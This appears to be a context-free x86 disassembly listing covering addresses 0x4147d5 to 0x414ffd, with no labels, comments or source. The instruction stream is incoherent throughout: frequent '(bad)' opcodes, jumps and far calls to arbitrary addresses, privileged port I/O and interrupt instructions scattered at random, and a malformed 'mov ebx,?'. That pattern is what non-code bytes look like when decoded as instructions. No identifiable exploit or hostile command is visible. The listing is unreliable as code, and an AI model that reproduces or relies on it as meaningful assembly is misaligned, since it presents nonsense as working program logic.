  4147d5:	add    BYTE PTR ds:0x1f50fa49,dl
  4147db:	bnd jae 0x4147ee
  4147de:	pop    es
  4147df:	jns    0x4147eb
  4147e1:	call   0x3e67da
  4147e6:	arpl   si,ax
  4147e8:	jb     0x41481a
  4147ea:	xor    DWORD PTR [eax-0x75],esi
  4147ed:	inc    esp
  4147ee:	pop    ecx
  4147ef:	dec    eax
  4147f0:	(bad)  
  4147f1:	call   FWORD PTR [edi-0x7e]
  4147f4:	xor    eax,0xa2d83974
  4147f9:	and    edi,DWORD PTR [esi]
  4147fb:	repz int 0xfe
  4147fe:	mov    esp,0x55b82a27
  414803:	jecxz  0x41483a
  414805:	(bad)  
  414806:	pushf  
  414807:	or     al,0x36
  414809:	je     0x414824
  41480b:	adc    esi,DWORD PTR [eax-0x2184f6f9]
  414811:	dec    BYTE PTR [esi]
  414813:	sbb    BYTE PTR [edx-0x7fd4f9da],dl
  414819:	retf   0x3430
  41481c:	lock mov edi,0xfe341ab8
  414822:	out    dx,al
  414823:	dec    ebp
  414824:	gs aaa 
  414826:	cs aad 0x65
  414829:	or     al,BYTE PTR [eax]
  41482b:	cli    
  41482c:	retf   
  41482d:	push   es
  41482e:	push   0xbd232041
  414833:	into   
  414834:	in     al,dx
  414835:	or     ebp,eax
  414837:	adc    eax,DWORD PTR [esi*1-0x27a15502]
  41483e:	pop    ebp
  41483f:	push   esi
  414840:	imul   eax,DWORD PTR [ecx+0xf],0xeb88ed31
  414847:	mov    al,0x63
  414849:	xor    esi,esi
  41484b:	sahf   
  41484c:	xchg   edx,eax
  41484d:	xchg   BYTE PTR [ebp+edx*4-0x11],al
  414851:	xor    al,0x74
  414853:	and    DWORD PTR [ebx-0x6266f452],eax
  414859:	adc    BYTE PTR [eax],al
  41485b:	xor    DWORD PTR [edi],esp
  41485d:	inc    edx
  41485e:	je     0x414856
  414860:	bound  edi,QWORD PTR [esi-0x16f6ce09]
  414866:	add    esi,DWORD PTR [ecx]
  414868:	inc    edx
  414869:	mov    ds:0xe9015f2f,eax
  41486e:	add    ecx,ebx
  414870:	or     bl,al
  414872:	add    ebx,ebx
  414874:	or     bl,dl
  414876:	add    esi,DWORD PTR [ebx+eax*8-0x7c522bcc]
  41487d:	cmp    al,0x2d
  41487f:	aaa    
  414880:	sub    DWORD PTR [eax+0x2521a534],ebx
  414886:	scas   eax,DWORD PTR es:[edi]
  414887:	sub    dh,BYTE PTR [edx]
  414889:	rcl    BYTE PTR [eax],0x31
  41488c:	or     edx,esp
  41488e:	inc    ebx
  41488f:	add    BYTE PTR [edx-0x6940fdf5],ah
  414895:	jnp    0x414847
  414897:	ret    0x2806
  41489a:	jae    0x4148af
  41489c:	or     DWORD PTR [esi-0x3e],esi
  41489f:	xor    al,0xf7
  4148a1:	xchg   esp,eax
  4148a2:	sbb    BYTE PTR [edi+0x34dd1db5],al
  4148a8:	out    0xb9,eax
  4148aa:	cmp    ch,BYTE PTR [ecx+eiz*8]
  4148ad:	repz aad 0x34
  4148b0:	test   eax,0xcf2cd88e
  4148b5:	sub    BYTE PTR [edx+0x4],dl
  4148b8:	(bad)  
  4148b9:	pop    esi
  4148ba:	mov    eax,0xb528bf2c
  4148bf:	scas   al,BYTE PTR es:[edi]
  4148c0:	sub    ch,BYTE PTR [eax]
  4148c2:	xor    ecx,DWORD PTR [ecx+ebx*4]
  4148c5:	xor    DWORD PTR [ebx+0x5328a734],esp
  4148cb:	xor    esp,DWORD PTR [edi+0x782b9528]
  4148d1:	out    dx,eax
  4148d2:	lea    esi,[edi+ecx*4]
  4148d5:	into   
  4148d6:	sub    BYTE PTR [eax],0xb6
  4148d9:	sub    bl,dh
  4148db:	aaa    
  4148dc:	xchg   esi,eax
  4148dd:	and    bh,bh
  4148df:	fidiv  DWORD PTR [edx]
  4148e1:	or     ecx,ecx
  4148e3:	stos   DWORD PTR es:[edi],eax
  4148e4:	or     DWORD PTR ss:[ebp+0x72],edx
  4148e8:	push   cs
  4148e9:	mov    ebx,eax
  4148eb:	pop    ecx
  4148ec:	or     eax,0x9764fe27
  4148f1:	and    al,0x4f
  4148f3:	dec    esi
  4148f4:	add    BYTE PTR [edi+0x2ebcff18],bl
  4148fa:	xor    edx,esp
  4148fc:	(bad)  [edx]
  4148fe:	or     DWORD PTR [ebx],ecx
  414900:	sub    DWORD PTR ds:0x32e9858e,ebp
  414906:	or     edi,eax
  414908:	lods   al,BYTE PTR ds:[esi]
  414909:	push   0x28
  41490b:	(bad)  
  41490c:	jmp    0x1d859943
  414911:	pop    ebp
  414912:	verw   cx
  414915:	fsub   DWORD PTR [edi]
  414917:	push   0x6827d8e9
  41491c:	jmp    0x9a3515d8
  414921:	scas   eax,DWORD PTR es:[edi]
  414922:	mov    ebx,?
  414924:	mul    BYTE PTR [edx]
  414926:	daa    
  414927:	dec    edi
  414928:	out    0xa8,al
  41492a:	pop    ds
  41492b:	(bad)  
  41492c:	push   esp
  41492d:	and    DWORD PTR [eax],esi
  41492f:	mov    ah,0xfb
  414931:	xor    cl,BYTE PTR [ecx]
  414933:	or     ebp,DWORD PTR [ecx+0x35eb0989]
  414939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41493a:	jns    0x414983
  41493c:	sub    BYTE PTR ds:0x1ad97428,dh
  414942:	adc    DWORD PTR [edx],ebp
  414944:	scas   al,BYTE PTR es:[edi]
  414945:	bound  edx,QWORD PTR [ebx+0x1bb874cf]
  41494b:	neg    BYTE PTR [esi-0x7eae279e]
  414951:	jae    0x414944
  414953:	dec    BYTE PTR [esi+0x139d42]
  414959:	add    BYTE PTR [eax],ch
  41495b:	add    eax,0xdbff2a44
  414960:	xchg   DWORD PTR [ebp-0x21c08],eax
  414966:	fbld   TBYTE PTR [ecx-0x24300812]
  41496c:	std    
  41496d:	jne    0x4149bb
  41496f:	fidiv  DWORD PTR [ebx+0x8]
  414972:	lock mov edi,0xdbfffffc
  414978:	mov    bl,0xf0
  41497a:	pop    es
  41497b:	fdiv   st(5),st
  41497d:	call   0x3e7aba
  414982:	call   DWORD PTR [ecx-0xa]
  414985:	jmp    0x414918
  414987:	fidiv  DWORD PTR [ebx-0x4]
  41498a:	inc    eax
  41498b:	dec    edx
  41498c:	adc    BYTE PTR [eax],al
  41498e:	or     dh,ah
  414990:	rcl    BYTE PTR [eax],0x8
  414993:	inc    edx
  414994:	mov    esp,ebp
  414996:	fwait
  414997:	rcl    DWORD PTR [edx+0xa602f57],1
  41499d:	call   0x3e6a4b
  4149a2:	adc    ecx,ebx
  4149a4:	jae    0x4149ab
  4149a6:	mov    edi,0xd81cc0e5
  4149ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149ac:	inc    ebx
  4149ad:	xchg   esp,eax
  4149ae:	arpl   WORD PTR [ecx+0x1a],bx
  4149b1:	movzx  edx,BYTE PTR [ebx+0xd]
  4149b5:	push   eax
  4149b6:	out    dx,eax
  4149b7:	mov    al,ds:0xa280e45
  4149bc:	mov    dh,0x47
  4149be:	add    ch,cl
  4149c0:	cmp    cl,BYTE PTR ds:0x500907b6
  4149c6:	(bad)  
  4149c8:	push   ebx
  4149c9:	or     DWORD PTR [eax-0x61],edx
  4149cc:	mov    al,ds:0xa580a45
  4149d1:	mov    dh,0x47
  4149d3:	xor    DWORD PTR [ecx],ebp
  4149d5:	ror    BYTE PTR [esi],cl
  4149d7:	(bad)  
  4149d8:	out    dx,eax
  4149d9:	sti    
  4149da:	dec    edi
  4149db:	ss out 0xc9,eax
  4149de:	add    eax,0x467936e1
  4149e3:	sub    eax,0xd9363300
  4149e8:	test   DWORD PTR [ebx-0x3862cec0],esi
  4149ee:	fwait
  4149ef:	add    DWORD PTR [eax+0x3031104b],edi
  4149f5:	test   ebx,eax
  4149f7:	add    eax,0x311fafb3
  4149fc:	fs mov ebx,0x313bc4fe
  414a02:	je     0x414a25
  414a04:	enter  0x35ff,0x2e
  414a08:	idiv   ebp
  414a0a:	mov    edi,0x447b7a9d
  414a0f:	mov    ecx,0x1607b806
  414a14:	test   DWORD PTR [edx],ecx
  414a16:	call   0xfe729c96
  414a1b:	push   es
  414a1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a1d:	xchg   esi,eax
  414a1e:	inc    BYTE PTR [eax+ebp*1+0x5300a01a]
  414a25:	pop    ds
  414a26:	xor    BYTE PTR [esp+esi*2+0x5cfed2d4],cl
  414a2d:	or     BYTE PTR [esp+edx*4],bl
  414a30:	adc    eax,DWORD PTR [edi+0x30]
  414a33:	(bad)  
  414a34:	pop    esp
  414a35:	cwde   
  414a36:	xor    BYTE PTR [ecx+ebp*1+0x48],dh
  414a3a:	jge    0x414a5d
  414a3c:	(bad)  
  414a3d:	dec    esi
  414a3e:	xor    BYTE PTR [ecx+ebx*4+0x37],dh
  414a42:	mov    al,ds:0x1c5eb624
  414a47:	das    
  414a48:	scas   al,BYTE PTR es:[edi]
  414a49:	fdiv   st(3),st
  414a4b:	(bad)  
  414a4c:	sbb    al,0x9
  414a4e:	add    DWORD PTR [ebx+eax*2],ebx
  414a51:	jmp    0x4149f0
  414a53:	xor    DWORD PTR [edi+0x5317c9b],edx
  414a59:	add    DWORD PTR [ecx-0x7ad9af62],eax
  414a5f:	jg     0x414a56
  414a61:	test   BYTE PTR [eax],bl
  414a63:	xor    ebp,edi
  414a65:	add    BYTE PTR [ecx+0x6d2610d2],al
  414a6b:	xor    ebp,ebx
  414a6d:	cld    
  414a6e:	gs mov bh,0x2e
  414a71:	ror    DWORD PTR es:[ebx],cl
  414a74:	dec    ecx
  414a75:	in     al,dx
  414a76:	or     dh,BYTE PTR [ecx]
  414a78:	dec    edi
  414a79:	and    eax,0xdb4e97d3
  414a7e:	or     esi,DWORD PTR [ecx]
  414a80:	aas    
  414a81:	lds    ebp,FWORD PTR [edi]
  414a83:	inc    esi
  414a84:	sbb    cl,BYTE PTR [ecx]
  414a86:	pushf  
  414a87:	jl     0x414a89
  414a89:	sbb    cl,BYTE PTR [ebx+0x25232824]
  414a8f:	and    eax,0x6c01a531
  414a94:	xchg   DWORD PTR [esi],edx
  414a96:	and    DWORD PTR ds:0x93247e31,edx
  414a9c:	sti    
  414a9d:	push   cs
  414a9e:	ret    0x3153
  414aa1:	jmp    DWORD PTR [ebx+esi*2]
  414aa4:	or     esp,DWORD PTR [esi+ecx*4+0x24ef2be8]
  414aab:	cwde   
  414aac:	xor    BYTE PTR [ebp+0x15],bl
  414aaf:	out    0xb6,al
  414ab1:	xor    DWORD PTR ss:[esi+0x5e],ebp
  414ab5:	xlat   BYTE PTR ds:[ebx]
  414ab6:	and    al,0x42
  414ab8:	add    al,0x5b
  414aba:	or     DWORD PTR [ecx+0x31],eax
  414abd:	xor    ecx,DWORD PTR [ecx]
  414abf:	jmp    0xb54b0042
  414ac4:	xor    BYTE PTR [edi+0x6042ffb9],dh
  414aca:	and    esi,DWORD PTR [ecx+ebx*8-0x3c]
  414ace:	and    al,0x68
  414ad0:	jmp    0xe9513d0f
  414ad5:	xor    cl,BYTE PTR [esp+eax*4-0x67]
  414ad9:	inc    ebp
  414ada:	and    edi,esi
  414adc:	stc    
  414add:	xor    cl,BYTE PTR [ecx]
  414adf:	add    BYTE PTR [esi+0x7ef218b7],ch
  414ae5:	inc    ecx
  414ae6:	or     al,BYTE PTR [eax]
  414ae8:	jmp    0x71c5971f
  414aed:	add    BYTE PTR ds:0x32e9fe23,bl
  414af3:	or     DWORD PTR [eax],eax
  414af5:	es scas eax,DWORD PTR es:[edi]
  414af7:	and    dl,dh
  414af9:	push   esi
  414afa:	add    DWORD PTR [esi+edi*8],esp
  414afd:	jmp    0xe195db34
  414b02:	mov    ebp,0xb7e969f9
  414b07:	mov    edi,gs
  414b09:	cmp    ah,BYTE PTR [ecx+0x23]
  414b0c:	dec    edi
  414b0d:	pop    esp
  414b0e:	scas   eax,DWORD PTR es:[edi]
  414b0f:	das    
  414b10:	repnz es popa 
  414b13:	aam    0x8c
  414b15:	cmp    dl,BYTE PTR fs:[edi]
  414b18:	(bad)  
  414b19:	push   ss
  414b1a:	loop   0x414b3e
  414b1c:	je     0x414b17
  414b1e:	inc    ecx
  414b1f:	popf   
  414b20:	or     eax,DWORD PTR [esi]
  414b22:	(bad)  
  414b23:	or     ebp,DWORD PTR [edx-0x17]
  414b26:	inc    ecx
  414b27:	popf   
  414b28:	pop    ss
  414b29:	test   BYTE PTR ds:0x4a2c82c8,0x17
  414b30:	(bad)  
  414b31:	out    0x35,al
  414b33:	adc    al,0x84
  414b35:	aam    0x2d
  414b37:	or     DWORD PTR [eax],eax
  414b39:	push   0x40
  414b3b:	xor    dl,dh
  414b3d:	into   
  414b3e:	push   ss
  414b3f:	and    al,0xd
  414b41:	add    BYTE PTR [ebp+eax*1-0x1],cl
  414b45:	dec    eax
  414b47:	jg     0x414bb3
  414b49:	jno    0x414ba4
  414b4b:	or     eax,0xf398858d
  414b50:	std    
  414b51:	inc    DWORD PTR [eax]
  414b53:	pop    eax
  414b54:	add    eax,0x7880fd9
  414b59:	test   eax,eax
  414b5b:	sub    al,0x16
  414b5d:	push   0xfe4e297b
  414b62:	mov    WORD PTR ds:0xf7fffc0d,cs
  414b68:	cmp    al,0xe6
  414b6a:	lds    edx,FWORD PTR [edi+0x7]
  414b6d:	add    BYTE PTR [ebp-0x507cdc68],al
  414b73:	dec    eax
  414b74:	pop    es
  414b75:	add    bh,al
  414b77:	int    0xf0
  414b79:	icebp  
  414b7a:	jmp    edi
  414b7c:	adc    DWORD PTR [eax],eax
  414b7e:	out    dx,eax
  414b7f:	mov    dh,0x84
  414b81:	test   DWORD PTR [ecx-0x77],esi
  414b84:	pop    es
  414b85:	lea    eax,[ebp-0x210b8]
  414b8b:	enter  0xa0fe,0xf
  414b8f:	sbb    BYTE PTR [edi],al
  414b91:	test   eax,eax
  414b93:	mov    esp,0x2c85c534
  414b98:	(bad)  
  414b99:	std    
  414b9a:	call   FWORD PTR [esi]
  414b9c:	pop    es
  414b9d:	out    dx,eax
  414b9e:	mov    esi,0x416fadb0
  414ba3:	or     BYTE PTR [edx-0xdcfff7d],cl
  414ba9:	std    
  414baa:	push   eax
  414bab:	xor    BYTE PTR [esi-0x6e27fff3],al
  414bb1:	mov    esi,0x83ca3774
  414bb6:	in     al,0x0
  414bb8:	sti    
  414bb9:	repz std 
  414bbb:	pop    es
  414bbc:	xor    DWORD PTR [eax],esi
  414bbe:	sbb    eax,0xb36f59bd
  414bc3:	inc    eax
  414bc4:	xor    DWORD PTR [ebp+0x63beff87],ebx
  414bca:	sub    eax,0xfed4994f
  414bcf:	jmp    DWORD PTR [esi+0x37442ad]
  414bd5:	mov    cl,0x6f
  414bd7:	jecxz  0x414b7b
  414bd9:	sub    DWORD PTR ds:0x6c8b3106,0x74
  414be0:	dec    ebp
  414be1:	push   es
  414be2:	add    al,0xff
  414be4:	add    al,0x1c
  414be6:	sub    eax,0x77a31d74
  414beb:	out    0x62,eax
  414bed:	fwait
  414bee:	sub    eax,0x31a49cfe
  414bf3:	(bad)  
  414bf4:	pop    esi
  414bf5:	stos   DWORD PTR es:[edi],eax
  414bf6:	mov    bh,0xf
  414bf8:	push   esi
  414bf9:	jge    0x414c21
  414bfb:	repnz dec esi
  414bfd:	mov    ebx,0xd3449a1a
  414c02:	sub    eax,0x33613ea
  414c07:	(bad)  
  414c08:	mov    esp,0x45742d33
  414c0d:	(bad)  [edi-0x19]
  414c10:	and    dh,bl
  414c12:	sub    eax,0x31fbe4fe
  414c17:	(bad)  
  414c18:	push   ss
  414c19:	add    edi,DWORD PTR [eax-0x3af1fff1]
  414c1f:	es repnz push es
  414c22:	adc    ebx,DWORD PTR [ebx]
  414c24:	jbe    0x414c22
  414c26:	or     ch,BYTE PTR [esi]
  414c28:	(bad)  
  414c29:	mov    esp,0xeefe3213
  414c2e:	pop    es
  414c2f:	xchg   edx,eax
  414c30:	push   cs
  414c31:	xor    DWORD PTR [eax],esi
  414c33:	cmp    eax,ecx
  414c35:	inc    ebp
  414c36:	or     ecx,ebp
  414c38:	(bad)  
  414c39:	stos   DWORD PTR es:[edi],eax
  414c3a:	xor    al,0x69
  414c3c:	dec    eax
  414c3d:	retf   0x1385
  414c40:	pop    esp
  414c41:	jnp    0x414c0b
  414c43:	call   0xae23914b
  414c48:	(bad)  
  414c49:	mov    edx,0x3103e908
  414c4e:	out    dx,al
  414c4f:	test   al,0xd4
  414c51:	idiv   BYTE PTR [eax-0x496528a5]
  414c57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c58:	pop    ss
  414c59:	leave  
  414c5a:	int    0x27
  414c5c:	add    al,0xb4
  414c5e:	dec    eax
  414c5f:	lar    ebx,WORD PTR [edx+0x7aaf69e5]
  414c66:	or     ah,bh
  414c68:	add    DWORD PTR [edx+0x63b410fd],ecx
  414c6e:	enter  0x2ce8,0xdd
  414c72:	and    al,0x6d
  414c74:	mov    bh,0x36
  414c76:	xor    DWORD PTR [edi+ebx*2],esp
  414c79:	push   edi
  414c7a:	and    DWORD PTR [ecx-0x29],esi
  414c7d:	dec    edx
  414c7e:	(bad)  
  414c7f:	cli    
  414c80:	sub    al,0x0
  414c82:	mov    ebp,0x36d24d24
  414c87:	push   eax
  414c88:	sub    cl,BYTE PTR [eax]
  414c8a:	xor    DWORD PTR [ecx+esi*2+0x3445b320],edi
  414c91:	call   0x11a5:0x2c8eb326
  414c98:	adc    ecx,ecx
  414c9a:	and    BYTE PTR ss:0x151d757b,bl
  414ca1:	mov    bh,0x2e
  414ca3:	xor    DWORD PTR [edi+0x2d],esi
  414ca6:	jmp    DWORD PTR [eax]
  414ca8:	nop
  414ca9:	dec    esp
  414caa:	xchg   edx,ecx
  414cac:	call   0xff9871dd
  414cb1:	mov    al,ds:0x74fd20f3
  414cb6:	fisubr DWORD PTR [eax]
  414cb8:	pushf  
  414cb9:	loop   0x414cc0
  414cbb:	pop    ds
  414cbc:	addr16 mov esi,0x40ffc9ad
  414cc2:	mov    ds:0x1ae940c8,eax
  414cc7:	jne    0x414cee
  414cc9:	mov    BYTE PTR ds:0x49514fd0,0x99
  414cd0:	inc    eax
  414cd1:	jmp    0x21f7222b
  414cd6:	jb     0x414cf8
  414cd8:	std    
  414cd9:	sbb    al,0x95
  414cdb:	sub    BYTE PTR [edi],dl
  414cdd:	popf   
  414cde:	pop    ebp
  414cdf:	pop    ds
  414ce0:	out    0xb5,eax
  414ce2:	nop
  414ce3:	pop    ds
  414ce4:	inc    BYTE PTR [ebx]
  414ce6:	add    BYTE PTR ds:0x73f859b1,dh
  414cec:	and    BYTE PTR [esi-0x31],ah
  414cef:	mov    ds:0x3300ffc9,eax
  414cf4:	or     DWORD PTR [eax],eax
  414cf6:	imul   edi,DWORD PTR [edx],0x566243e
  414cfc:	adc    eax,eax
  414cfe:	aad    0x52
  414d00:	test   al,0x61
  414d02:	fdiv   DWORD PTR [ebx+0x20]
  414d05:	dec    esi
  414d06:	inc    ecx
  414d07:	fsub   st,st(5)
  414d09:	inc    BYTE PTR [esi+0x62]
  414d0c:	sar    dh,1
  414d0e:	hlt    
  414d0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d10:	enter  0xe940,0x55
  414d14:	xchg   ebp,eax
  414d15:	pop    es
  414d16:	inc    ecx
  414d17:	or     eax,0x3a26fe23
  414d1c:	push   0x21
  414d1e:	push   ds
  414d1f:	pop    ebp
  414d20:	test   al,0x1e
  414d22:	cdq    
  414d23:	repz pop ds
  414d25:	std    
  414d26:	aam    0x84
  414d28:	enter  0x40,0x8
  414d2c:	in     eax,dx
  414d2d:	jae    0x414d37
  414d2f:	inc    eax
  414d30:	and    eax,0x80dffff9
  414d35:	(bad)  
  414d36:	scas   al,BYTE PTR es:[di]
  414d38:	pop    ebx
  414d39:	aas    
  414d3a:	add    bh,cl
  414d3c:	sbb    DWORD PTR [eax+ecx*2+0x75ff0519],esi
  414d43:	rol    BYTE PTR [ebx],1
  414d45:	mov    al,0xfb
  414d47:	out    dx,eax
  414d48:	repz push 0xb9600000
  414d4e:	outs   dx,BYTE PTR ds:[esi]
  414d4f:	inc    ecx
  414d50:	cwde   
  414d51:	repnz xor esi,DWORD PTR [esi-0x101b9b0]
  414d58:	gs sbb eax,0xf3d39ce6
  414d5e:	std    
  414d5f:	jmp    DWORD PTR ds:0x9075fdf1
  414d65:	add    edx,edi
  414d67:	pop    ds
  414d68:	scas   eax,DWORD PTR es:[edi]
  414d69:	repz mov edx,0x8b550b84
  414d70:	mov    esp,0xdef4c285
  414d75:	repz std 
  414d77:	push   0x48
  414d79:	jge    0x414dd8
  414d7b:	push   DWORD PTR [ebp+0x23]
  414d7e:	out    0x79,al
  414d80:	dec    edi
  414d81:	repnz std 
  414d83:	mov    DWORD PTR [ebp+0x6d05c5e7],edx
  414d89:	imul   edi,DWORD PTR [edi],0x0
  414d8c:	dec    edx
  414d8d:	or     eax,DWORD PTR [eax]
  414d8f:	add    BYTE PTR [ebp+0x5ffef588],bl
  414d95:	repnz dec esi
  414d97:	push   0x614
  414d9c:	inc    eax
  414d9d:	out    0xb,al
  414d9f:	add    BYTE PTR [eax],bl
  414da1:	or     DWORD PTR [ebx],0x72
  414da4:	xor    DWORD PTR [ecx+0x2],esi
  414da7:	push   0xffc38230
  414dac:	mov    fs,WORD PTR [esi-0x5d]
  414daf:	inc    eax
  414db0:	add    BYTE PTR [ecx],dh
  414db2:	pop    ds
  414db3:	out    dx,eax
  414db4:	mov    ch,0x79
  414db6:	jno    0x414dba
  414db8:	jmp    DWORD PTR [eax+ebp*1+0x1a]
  414dbc:	fist   DWORD PTR [edx+0x3c672927]
  414dc2:	ret    0xffc4
  414dc5:	dec    esi
  414dc6:	xor    DWORD PTR [eax+eax*2+0x60c9c831],esi
  414dcd:	jo     0x414dff
  414dcf:	call   0x1cfe:0x82303101
  414dd6:	sub    BYTE PTR [edx],bl
  414dd8:	mov    edi,0x8c296fd2
  414ddd:	lods   al,BYTE PTR ds:[esi]
  414dde:	jg     0x414e08
  414de0:	dec    BYTE PTR [esi+0x348b1be0]
  414de6:	xor    BYTE PTR [edx],al
  414de8:	(bad)  
  414de9:	xor    al,0xd
  414deb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dec:	inc    eax
  414ded:	xor    DWORD PTR [ebx],esi
  414def:	add    al,BYTE PTR [eax]
  414df1:	xor    DWORD PTR [ebp-0x68980981],ebp
  414df7:	sub    DWORD PTR [edi-0x37],ecx
  414dfa:	and    eax,DWORD PTR [ebx]
  414dfc:	add    BYTE PTR [ecx],dh
  414dfe:	mov    eax,0x30310c85
  414e03:	call   0x3068:0x270c30c
  414e0a:	inc    edx
  414e0b:	ret    
  414e0c:	dec    esi
  414e0e:	mov    gs:0xefdf3140,eax
  414e14:	mov    ch,0x0
  414e16:	jns    0x414e89
  414e18:	add    bh,bh
  414e1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e1b:	sub    BYTE PTR [edx],bl
  414e1d:	jnp    0x414df1
  414e1f:	or     BYTE PTR [esi],ah
  414e21:	sub    dl,BYTE PTR [esi+0x6c49b0c]
  414e27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e28:	out    0xb5,eax
  414e2a:	jno    0x414e35
  414e2c:	or     ecx,0x9be8c891
  414e32:	xor    BYTE PTR [ecx],cl
  414e34:	jmp    0xe0d535bc
  414e39:	sbb    edi,DWORD PTR [esi+0x6a]
  414e3c:	in     eax,dx
  414e3d:	sub    DWORD PTR [ebp-0x30d5227d],esp
  414e43:	sbb    eax,0xc1a1c38
  414e48:	jmp    0xccd50c50
  414e4d:	sub    DWORD PTR ds:0x4c33d111,edi
  414e53:	push   ds
  414e54:	mov    ebp,0xe904703b
  414e59:	into   
  414e5a:	stos   DWORD PTR es:[edi],eax
  414e5b:	sub    al,0x69
  414e5d:	inc    eax
  414e5e:	call   0x95c5:0x16cc38b5
  414e65:	les    eax,FWORD PTR [esi+0x72031a15]
  414e6b:	sbb    eax,0x87abfa5
  414e70:	jmp    0xe29f7f78
  414e75:	mov    ch,0xf1
  414e77:	or     BYTE PTR [esi-0x51],dh
  414e7a:	add    BYTE PTR [esi],dh
  414e7c:	mov    fs,ebx
  414e7e:	gs jecxz 0x414e48
  414e81:	call   0xe919e025
  414e86:	add    esi,DWORD PTR [ecx]
  414e88:	mov    eax,edx
  414e8a:	add    eax,0x28e09531
  414e8f:	mov    ebp,0x46765110
  414e94:	sbb    al,0x3d
  414e96:	sbb    ebx,esi
  414e98:	or     DWORD PTR [eax],eax
  414e9a:	jmp    0x41a7fd1
  414e9f:	dec    eax
  414ea0:	sbb    edi,esi
  414ea2:	pushf  
  414ea3:	or     ah,BYTE PTR ds:0x1b59fc8a
  414ea9:	mov    ds:0xffc9c477,al
  414eae:	test   BYTE PTR [ecx-0x2b],cl
  414eb1:	(bad)  
  414eb2:	call   0x25cc57e9
  414eb7:	xchg   ecx,eax
  414eb8:	sbb    esi,DWORD PTR [ecx+ebp*8]
  414ebb:	xor    cl,BYTE PTR [ecx]
  414ebd:	add    BYTE PTR [edx+eax*1-0xd1ee05b],dl
  414ec4:	sbb    al,0x66
  414ec6:	rol    BYTE PTR [ecx],0xdc
  414ec9:	(bad)  
  414eca:	cmp    BYTE PTR [ecx+0x32e92491],dl
  414ed0:	or     DWORD PTR [eax],eax
  414ed2:	(bad)  
  414ed3:	fild   WORD PTR [edi+edi*8]
  414ed6:	(bad)  
  414ed7:	mov    bl,0xdb
  414ed9:	cmp    eax,0x721c752d
  414ede:	into   
  414edf:	add    BYTE PTR [ebp-0x75e2f0ec],ch
  414ee5:	inc    ebx
  414ee6:	inc    esp
  414ee7:	popf   
  414ee8:	xor    ecx,DWORD PTR [ecx]
  414eea:	add    cl,ch
  414eec:	sbb    eax,0xa8d4fef9
  414ef1:	xchg   edi,eax
  414ef2:	inc    eax
  414ef3:	jmp    0xfae32411
  414ef8:	jae    0x414f16
  414efa:	out    0x7d,al
  414efc:	sub    al,0x1c
  414efe:	(bad)  
  414eff:	push   0x16
  414f01:	hlt    
  414f02:	jmp    0x7772:0xeb8f7fae
  414f09:	adc    BYTE PTR [ebx+0x711c22ac],cl
  414f0f:	loope  0x414eca
  414f11:	fwait
  414f12:	mov    bh,0x0
  414f14:	sbb    BYTE PTR [eax],cl
  414f16:	add    bh,bh
  414f18:	jmp    0x8:0x4c808d13
  414f1f:	add    BYTE PTR [edi+0x56],al
  414f22:	push   cs
  414f23:	(bad)  
  414f24:	cwde   
  414f25:	lods   al,BYTE PTR ds:[esi]
  414f26:	(bad)  
  414f27:	call   FWORD PTR [eax]
  414f29:	test   DWORD PTR [ebx],edi
  414f2b:	mov    ds:0xfffe469b,al
  414f30:	pushf  
  414f31:	idiv   dh
  414f33:	xor    eax,0x3f5556
  414f38:	out    0x2d,eax
  414f3a:	mov    al,ds:0xe8078973
  414f3f:	mov    cl,0x2
  414f41:	icebp  
  414f42:	std    
  414f43:	mov    eax,0x7d800
  414f48:	add    BYTE PTR ds:0x6c0022c7,al
  414f4e:	xchg   esp,eax
  414f4f:	add    eax,DWORD PTR [eax]
  414f51:	enter  0x7,0x83
  414f55:	fisttp WORD PTR [eax]
  414f57:	cmp    DWORD PTR [edi],0xffffff98
  414f5a:	adc    al,BYTE PTR [ebx-0x21c18c1]
  414f60:	mov    ecx,DWORD PTR [ebp-0xf]
  414f63:	pop    ebp
  414f64:	leave  
  414f65:	fimul  DWORD PTR [eax]
  414f67:	add    BYTE PTR [ebp+0x3],dl
  414f6a:	add    DWORD PTR [edx+0x4e4aa4c4],eax
  414f70:	pop    eax
  414f71:	xor    BYTE PTR [ebx-0xa],dl
  414f74:	inc    eax
  414f75:	pop    eax
  414f76:	out    dx,eax
  414f77:	jo     0x414f7a
  414f79:	fwait
  414f7a:	jecxz  0x414f05
  414f7c:	leave  
  414f7d:	rcr    ebp,cl
  414f7f:	sub    esi,esi
  414f81:	rcr    ebp,cl
  414f83:	data16 cli 
  414f85:	ja     0x414fb0
  414f87:	dec    DWORD PTR [edx-0x3bc6bff]
  414f8d:	xor    DWORD PTR [edi-0x58e415c4],esp
  414f93:	cmp    al,0x2
  414f95:	not    DWORD PTR [edi-0x2645b0c4]
  414f9b:	sbb    edi,edi
  414f9d:	sub    dh,BYTE PTR [eax]
  414f9f:	add    cl,BYTE PTR [ebx-0x37868718]
  414fa5:	xor    ch,dh
  414fa7:	jp     0x414f71
  414fa9:	add    BYTE PTR [esi],al
  414fab:	outs   dx,BYTE PTR ds:[esi]
  414fac:	cmp    BYTE PTR es:[esp+esi*8+0x3],0x75
  414fb2:	adc    DWORD PTR [ebx+0x3b],ebp
  414fb5:	ret    0x9784
  414fb8:	pop    ss
  414fb9:	dec    edi
  414fba:	mov    DWORD PTR [eax-0x74],edi
  414fbd:	div    DWORD PTR [ecx+0x30]
  414fc0:	sub    dh,BYTE PTR [ecx+0x30]
  414fc3:	out    dx,eax
  414fc4:	mov    dh,BYTE PTR es:[eax+ebx*1-0x7]
  414fc9:	mov    edi,0x4192c3d
  414fce:	mov    edi,0x71072428
  414fd3:	mov    al,0xea
  414fd5:	jmp    DWORD PTR ds:0x2dc13b5a
  414fdb:	xor    bh,cl
  414fdd:	mov    cl,BYTE PTR [ebp+0x2f33eaf]
  414fe3:	add    ah,cl
  414fe5:	addr16 jno 0x415050
  414fe8:	ret    0x7eff
  414feb:	inc    BYTE PTR [ebx+eax*8]
  414fee:	jle    0x41505b
  414ff0:	mov    edi,0x23031f3
  414ff5:	add    BYTE PTR [edx],bl
  414ff7:	addr16 ja 0x41503e
  414ffa:	add    BYTE PTR gs:[edi],ah
  414ffd:	je     0x415028
